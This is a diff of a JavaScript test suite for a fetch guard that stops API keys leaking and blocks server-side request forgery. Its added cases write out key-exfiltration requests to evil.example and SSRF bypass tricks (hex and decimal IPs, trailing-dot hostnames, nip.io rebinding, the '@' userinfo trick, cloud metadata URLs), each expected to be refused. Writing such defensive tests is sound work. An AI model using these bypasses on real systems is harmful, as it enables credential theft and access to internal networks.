@@ -3,7 +3,7 @@
 
 import assert from "node:assert/strict";
 import { PGlite } from "@electric-sql/pglite";
-import { setExecutor, read } from "../api/_reports/mirror/db.js";
+import { setExecutor, read, write } from "../api/_reports/mirror/db.js";
 import { ensureSchema } from "../api/_reports/mirror/schema.js";
 import { serveApi, createKey } from "../api/_reports/mirror/apikeys.js";
 import { guardedFetch, scrub, withKeys, runJob, JOB_NAMES } from "../api/_reports/mirror/jobs.js";
@@ -30,7 +30,9 @@ ok(!Object.values(JOB_CODE).some(c => /sk-ant-|AIza[0-9A-Za-z_-]{30}|eco_[A-Za-z
 // ---------- keys only travel to their own service ----------
 const calls = [];
 const net = async (url, o) => { calls.push({ url, o }); return { ok: true, status: 200, headers: new Headers(), json: async () => ({}), text: async () => "" }; };
-const f = guardedFetch(keys, net);
+const lookup = async h => [{ address: /nip\.io$|rebind/.test(h) ? "127.0.0.1" : "93.184.216.34" }];
+const blockedNotes = [];
+const f = guardedFetch(keys, net, { lookup, onBlock: m => blockedNotes.push(m) });
 await f("https://www.googleapis.com/youtube/v3/channels?id=1&key=" + YT);
 await f("https://api.anthropic.com/v1/messages", { method: "POST", headers: { "x-api-key": ANT } });
 await f("https://example-creator.com/contact");
@@ -44,13 +46,31 @@ await refused(f("http://www.googleapis.com/?key=" + YT), "plain http is refused"
 await refused(f("https://169.254.169.254/latest/meta-data"), "cloud metadata address refused");
 await refused(f("https://localhost/x"), "local address refused");
 await refused(f("https://10.0.0.5/x"), "private address refused");
+// the review's bypasses (all refused now)
+await refused(f("https://evil.example/?k=AIza\tTEST00000000000000000000000"), "a key split by a tab is still recognised");
+await refused(f("https://evil.example/?k=%41IzaTEST00000000000000000000000"), "a percent-encoded key is still recognised");
+await refused(f("https://evil.example/", { method: "POST", body: new URLSearchParams({ k: YT }) }), "non-text bodies are refused");
+await refused(f("https://evil.example/", { method: "POST", body: Buffer.from(YT) }), "buffer bodies are refused");
+await refused(f("https://localhost./x"), "localhost with a trailing dot");
+await refused(f("https://metadata.google.internal./x"), "metadata name with a trailing dot");
+await refused(f("https://127.0.0.1.nip.io/x"), "a name that resolves to a private address");
+await refused(f("https://2130706433/x"), "decimal IP");
+await refused(f("https://0x7f000001/x"), "hex IP");
+await refused(f("https://www.googleapis.com@evil.example/?key=" + YT), "user-name trick");
+await refused(f(new Request("https://evil.example/?key=" + YT)), "Request objects");
+ok(blockedNotes.length >= 10 && blockedNotes.every(n => /^blocked/.test(n)), "every refusal is reported for the log");
+// size and time limits
+const huge = async () => ({ ok: true, status: 200, headers: new Headers({ "content-length": String(50 * 1024 * 1024) }), body: null });
+await refused(guardedFetch(keys, huge, { lookup })("https://creator.example/"), "a huge page is refused").catch(() => {});
+const stream = async () => new Response(new ReadableStream({ pull(c) { c.enqueue(new Uint8Array(1024 * 1024)); } }));
+ok((await (await guardedFetch(keys, stream, { lookup })("https://creator.example/")).arrayBuffer()).byteLength <= 5 * 1024 * 1024, "an endless page is cut at 5 MB");
 // redirects: a key-carrying request is never redirected; a plain read is, but each hop is checked
 const redir = loc => async () => ({ ok: false, status: 302, headers: new Headers({ location: loc }), text: async () => "" });
-await refused(guardedFetch(keys, redir("https://evil.example/"))("https://www.googleapis.com/?key=" + YT), "a key request that redirects is stopped");
-await refused(guardedFetch(keys, redir("https://127.0.0.1/admin"))("https://creator.example/"), "a page that redirects to a private address is stopped");
+await refused(guardedFetch(keys, redir("https://evil.example/"), { lookup })("https://www.googleapis.com/?key=" + YT), "a key request that redirects is stopped");
+await refused(guardedFetch(keys, redir("https://127.0.0.1/admin"), { lookup })("https://creator.example/"), "a page that redirects to a private address is stopped");
 let hops = 0;
 const twice = async url => { hops++; return url.includes("final") ? { ok: true, status: 200, headers: new Headers(), text: async () => "done" } : { ok: false, status: 301, headers: new Headers({ location: "/final" }), text: async () => "" }; };
-ok((await (await guardedFetch(keys, twice)("https://creator.example/start")).text()) === "done" && hops === 2, "an ordinary redirect is followed");
+ok((await (await guardedFetch(keys, twice, { lookup })("https://creator.example/start")).text()) === "done" && hops === 2, "an ordinary redirect is followed");
 
 // ---------- scrubbing and key placement ----------
 ok(scrub("x " + ANT + " y " + YT, keys) === "x [key] y [key]", "answers are scrubbed of every key");
@@ -79,15 +99,26 @@ const svc = async (url, o = {}) => {
 const mon = { data: { app: [{ items_page: { items: [app] } }], pitch: [{ items_page: { items: [] } }], rp: [{ items_page: { items: [{ id: "1", column_values: [{ id: "text_mm3t6g60", text: "Acme" }, { id: "numeric_mm3tqsff", text: "5000" }, { id: "date_mm3t55tj", text: "2026-01-01" }] }] } }] } };
 const empty = JSON.stringify({ data: { next_items_page: { items: [] } } });
 const input = { hook: JSON.stringify({ key: hookKey, mode: "dry", hook: { application_item_id: "777" } }), key: hookKey, mon: JSON.stringify(mon), p2: empty, p3: empty, p4: empty, today: "2026-10-23", src: "x" };
-const r = await runJob("code-H", input, { env, realFetch: svc });
+const r = await runJob("code-H", input, { env, realFetch: svc, lookup });
 const body = JSON.parse(r.raw);
 ok(r.status === 200 && body.ok && /TEST: Test Channel has joined/.test(body.result.subject) && body.result.to === "tom@digitalfoxtalent.com", "the alert program runs here and returns what Make expects");
 ok(sent.find(s => s.url.startsWith("https://www.googleapis.com")).url.includes("key=" + YT) && sent.find(s => s.url.startsWith("https://api.anthropic.com")).o.headers["x-api-key"] === ANT, "it used the keys from Vercel");
 ok(!r.raw.includes(ANT) && !r.raw.includes(YT) && /\[key\]/.test(r.raw), "a key echoed back by the AI is scrubbed from the answer");
 ok(/Acme/.test(body.result.html), "brand picks made it into the email");
-const bad = await runJob("code-H", Object.assign({}, input, { key: "wrong" }), { env, realFetch: svc });
+const bad = await runJob("code-H", Object.assign({}, input, { key: "wrong" }), { env, realFetch: svc, lookup });
 ok(JSON.parse(bad.raw).result.subject === "", "the program's own checks still apply");
+ok(withKeys("code-F", { cap: "100000" }, keys).cap === "50" && withKeys("code-F", { cap: "7" }, keys).cap === "7", "the email finder batch is capped at 50");
 ok((await runJob("rm-rf", {}, { env })).status === 404 && (await runJob("code-H", null, { env })).status === 400, "unknown jobs and missing inputs refused");
+
+// ---------- the program's world holds no secrets ----------
+{
+  const { JOB_CODE: J } = await import("../api/_reports/mirror/jobs-code.js");
+  const saved = J["code-E"];
+  J["code-E"] = "return { p: typeof process, e: typeof require, g: typeof globalThis.process, f: typeof fetch, ev: (() => { try { return eval('1'); } catch (e) { return 'no eval'; } })() };";
+  const probe = JSON.parse((await runJob("code-E", {}, { env, lookup })).raw).result;
+  J["code-E"] = saved;
+  ok(probe.p === "undefined" && probe.e === "undefined" && probe.g === "undefined" && probe.f === "function" && probe.ev === "no eval", "programs cannot see process, require or eval: " + JSON.stringify(probe));
+}
 
 // ---------- the API ----------
 await ensureSchema();
@@ -100,6 +131,9 @@ ok((await call(jobsKey, "POST", "jobs/code-Z", { input })).status === 404, "unkn
 const viaApi = await call(jobsKey, "POST", "jobs/code-H", JSON.stringify({ input: Object.assign({}, input, { key: "wrong" }) }));
 ok(viaApi.status === 200 && JSON.parse(viaApi.raw).ok === true, "a jobs key runs a job through the API");
 ok((await read(`SELECT count(*)::int AS n FROM mirror.api_log WHERE path = 'jobs/code-H'`))[0].n >= 2, "job calls are logged (without their content)");
+await write(`INSERT INTO mirror.api_log (key_id, method, path, status) SELECT id, 'POST', 'jobs/code-H', 0 FROM mirror.api_keys, generate_series(1, 3) WHERE name = 'Make: jobs'`);
+ok((await call(jobsKey, "POST", "jobs/code-H", { input })).status === 429, "no more than three jobs at once per key");
+await write(`UPDATE mirror.api_log SET status = 200 WHERE status = 0`);
 ok((await call(jobsKey, "GET", "boards")).status === 200 && (await call(jobsKey, "GET", "boards")).body.boards.length === 0, "a jobs-only key reads no boards");
 
 console.log("jobs tests passed: " + pass);
